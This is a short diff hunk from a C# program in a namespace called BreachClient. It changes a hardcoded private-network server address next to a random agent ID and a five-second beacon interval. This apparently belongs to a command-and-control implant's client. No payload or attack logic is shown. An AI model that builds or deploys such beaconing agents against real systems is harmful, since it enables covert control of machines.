@@ -15,7 +15,7 @@ namespace BreachClient
     class Program
     {
         private static readonly HttpClient http = new HttpClient();
-        private static readonly string ServerId = "http://172.20.10.3:8080";
+        private static readonly string ServerId = "http://192.168.10.4:8080";
         private static readonly string AgentId = Guid.NewGuid().ToString();
         private static readonly int BeaconInterval = 5000; // ms
 
